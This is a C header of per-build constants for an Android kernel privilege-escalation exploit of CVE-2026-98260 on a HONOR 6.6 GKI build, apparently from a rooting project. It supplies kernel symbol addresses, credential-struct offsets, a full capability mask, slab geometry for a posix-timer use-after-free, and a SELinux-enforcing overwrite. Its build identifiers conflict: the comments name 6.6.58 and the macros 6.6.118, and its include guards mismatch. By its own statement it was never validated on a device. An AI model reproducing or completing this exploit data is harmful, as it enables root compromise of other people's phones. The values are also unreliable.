/* pc98260_target_66118.h — CVE-2026-98260 per-build constants.
 *
 * Target: HONOR 6.6.58 build g6484937db664 (Android 15 base)
 *   kernel_release = 6.6.58-android15-8-g6484937db664-abogki407459068-4k
 *   4K pages, VA_BITS=39, Qualcomm "sun" (SM8750), KMI android15-8
 *
 * Derived from (all offline, no device access):
 *   - boot(3).img  sha256 bf22d44ba14dd87327ea7b5dc8bb28fd71b1ae4b71c39e1f10a204c62039e278
 *   - kernel Image sha256 fdd20c970461e368fee4e361b03a2d5e72132192f5a13f1bb5467958937ff2b8
 *     (extracted at boot header v4 offset 0x1000, size 0x2342800)
 *   - C:\Users\HourG\Documents\deepseek-harness\MagicRoot98260\work/6658/vmlinux.elf (vmlinux-to-elf)
 *   - C:\Users\HourG\Documents\deepseek-harness\MagicRoot98260\work/6658/kernel.img embedded .BTF at 0x1729758
 *   - capstone disassembly of begin_new_exec / do_timer_create / prepare_creds
 *   - config: CONFIG_KALLSYMS_ALL=y CONFIG_KALLSYMS_BASE_RELATIVE=y CONFIG_MODVERSIONS=y
 *
 * Do NOT reuse these numbers for another build: even the same 6.6.118 GKI has a
 * different -g<commit>-abogki<id> and different call sites. Re-run
 * tools/cve-98260-porting-tools/derive_profile.py + BTF query per build.
 *
 * Status: STATIC DERIVATION ONLY — never validated on a device.
 *   GEO_TASK_OBJSIZE is a placeholder: uaf_plant overrides it from
 *   /proc/slabinfo at runtime (slab_task_objsize()), so a wrong value cannot
 *   poison the credential write; it only affects the task_alloc filter.
 */
#ifndef PC98260_TARGET_66118_H
#define PC98260_TARGET_GA812_H

#include <stdint.h>

#define TARGET_NAME          "honor-66118-ga812"
#define TARGET_KERNEL        "6.6.118-android15-8-ga812a1946391-abogki576098434-4k"
 /* arm64 Image sha256 */

/* ---- absolute addresses (link-time; add g_slide at runtime) ---------- */
#define LINK_SELINUX_STATE   UINT64_C(0xffffffc0823ca418)  /* selinux_state */
#define LINK_INIT_USER_NS    UINT64_C(0xffffffc08219ef98)  /* init_user_ns */
#define LINK_ROOT_USER       UINT64_C(0xffffffc08219f228)  /* root_user    */
#define LINK_INIT_GROUPS     UINT64_C(0xffffffc0821a0788)  /* init_groups  */
#define LINK_INIT_UCOUNTS    UINT64_C(0xffffffc0821a0cf8)  /* init_ucounts */

/* ---- kprobe/tracepoint call sites (function-internal; NOT portable) ---
 * node[0] of the address is the instruction right after
 * `bl kmem_cache_alloc`; the kmem tracepoint records exactly this value.
 */
#define LINK_ALLOC_TIMER     UINT64_C(0xffffffc0803b13d4)  /* do_timer_create+0x94 (posix_timers_cache) */
#define LINK_ALLOC_CRED      UINT64_C(0xffffffc08023870c)  /* prepare_creds+0x20 (cred_jar) */
#define LINK_ALLOC_TASK      UINT64_C(0xffffffc0800341ac)  /* copy_process+0x144 (task_struct_cachep) */

/* ---- struct geometry (6.6.58 .BTF, byte offsets) ---- */
#define GEO_TASK_CRED        0x820   /* task_struct.cred          */
#define GEO_TASK_REAL_CRED   0x818   /* task_struct.real_cred     */
#define GEO_TASK_COMM        0x830   /* task_struct.comm          */
#define GEO_KITIMER_IT       0x78    /* k_itimer.it (cpu_timer.node) */
#define GEO_KITIMER_SIZE     0x108   /* sizeof(k_itimer) = 264    */
#define GEO_KITIMER_STRIDE   0x108   /* posix_timers_cache object */
#define GEO_CRED_SIZE        184     /* sizeof(struct cred)       */
#define GEO_CRED_ALLOC_SIZE  192     /* cred_jar cache object size (bytes_alloc) */
#define GEO_CRED_UID         0x8
#define GEO_CRED_GID         0xc
#define GEO_CRED_SUID        0x10
#define GEO_CRED_SGID        0x14
#define GEO_CRED_EUID        0x18
#define GEO_CRED_EGID        0x1c
#define GEO_CRED_FSUID       0x20
#define GEO_CRED_FSGID       0x24
#define GEO_CRED_CAP_INH     0x30
#define GEO_CRED_CAP_PERM    0x38
#define GEO_CRED_CAP_EFF     0x40
#define GEO_CRED_CAP_BSET    0x48
#define GEO_CRED_CAP_AMB     0x50
#define GEO_CRED_SECURITY    0x80
#define GEO_CRED_USER        0x88
#define GEO_CRED_USER_NS     0x90
#define GEO_CRED_UCOUNTS     0x98
#define GEO_CRED_GROUP_INFO  0xa0
#define GEO_SELINUX_ENFORCE  0
#define GEO_SELINUX_INIT     1
#define GEO_SELINUX_WRITE    (-7)   /* clear 7 bytes + enforcing */
#define GEO_SELINUX_SIZE     0x80

/* ---- slab geometry (live /proc/slabinfo) ---------------------------- */
/* Unknown offline. uaf_plant reads /proc/slabinfo and overrides g_task_obj, so
 * this is only a seed value; k_itimer/posix_timers_cache is 264 B (BTF). */
#define GEO_TASK_OBJSIZE            4800  /* seed: sizeof(task_struct)=0x12c0; verify live */
#define GEO_TASK_OBJ_PER_SLAB       0
#define GEO_TASK_SLAB_PAGES         0
#define GEO_POSIX_TIMER_OBJSIZE     264
#define GEO_POSIX_TIMER_OBJ_PER_SLAB 31
#define GEO_POSIX_TIMER_SLAB_ORDER  1     /* 2 pages = 8192 bytes             */
#define GEO_PAGE_SIZE               4096
#define GEO_FRAG_PAGE_SIZE          8192  /* posix_timers_cache slab          */

/* ---- kernel addressing ---------------------------------------------- */
#define GEOM_PAGE_OFFSET     UINT64_C(0xffffff8000000000)
#define GEOM_VA_BITS         39
#define GEOM_MEMSTART_PFN    UINT64_C(0x80000) /* verify on device (/proc/iomem) */
#define GEOM_MEMSTART_ADDR   UINT64_C(0xffffffc08169a508) /* memstart_addr symbol */

/* ---- privilege bitmask ---------------------------------------------- */
#define CAP_FULL             UINT64_C(0x1ffffffffff) /* cap_last_cap=40 */

/* ---- begin_new_exec cleanup offsets (vulnerability check) ----------- */
#define BNE_LINK              UINT64_C(0xffffffc08029220c) /* begin_new_exec      */
#define BNE_RELEASE_TASK_OFF  0x990  /* bl release_task           */
#define BNE_DOWN_READ_OFF     0x9ac  /* bl __percpu_down_read (inlined exec_mmap) */
#define BNE_TIMERS_EXIT_OFF   0x298  /* bl posix_cpu_timers_exit  */
#define BNE_EXIT_ITIMERS_OFF  0x2a8  /* bl exit_itimers           */

#endif /* PC98260_TARGET_66118_H */

